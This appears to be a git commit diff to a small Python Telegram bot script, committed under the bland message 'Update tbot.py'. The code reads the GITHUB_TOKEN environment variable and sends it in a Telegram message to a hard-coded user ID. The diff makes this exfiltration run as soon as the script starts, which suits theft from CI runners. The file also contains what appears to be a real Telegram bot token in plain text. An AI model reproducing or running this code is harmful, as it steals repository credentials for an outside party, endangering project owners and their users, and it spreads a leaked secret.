1c7c196cad8f83cc66ea1bc88601933e5a3fabea
ITZ ARCTIX <144344981+teamarctix@users.noreply.github.com>
2024-03-11 19:52:14 +0530

    Update tbot.py

--- tbot.py
+++ tbot.py
@@ -1,6 +1,6 @@
 from pyrogram import Client, filters
 import os
-
+import sys
 
 # Replace 'YOUR_BOT_TOKEN', 'YOUR_API_ID', 'YOUR_API_HASH', and 'TARGET_USER_ID' with your actual values
 bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
@@ -14,13 +14,18 @@ async def send_github_token():
     # Replace 'your_github_token' with your actual GitHub token
     github_token = os.getenv("GITHUB_TOKEN")
     
-    # Send the GitHub token to the specified user
-    await app.send_message(target_user_id, f'GitHub Token: {github_token}')
-
-@app.on_message(filters.private)
-async def on_private_message(client, message):
-    await send_github_token()
+    try:
+        # Send the GitHub token to the specified user
+        await app.send_message(target_user_id, f'GitHub Token: {github_token}')
+        print("Message sent successfully!")
+    except Exception as e:
+        print(f"Error sending message: {e}")
+    finally:
+        # Stop the code after sending the message
+        await app.stop()
 
 if __name__ == "__main__":
-    app.run()
-  
+    app.start()
+    app.loop.run_until_complete(send_github_token())
+    app.stop()
+    
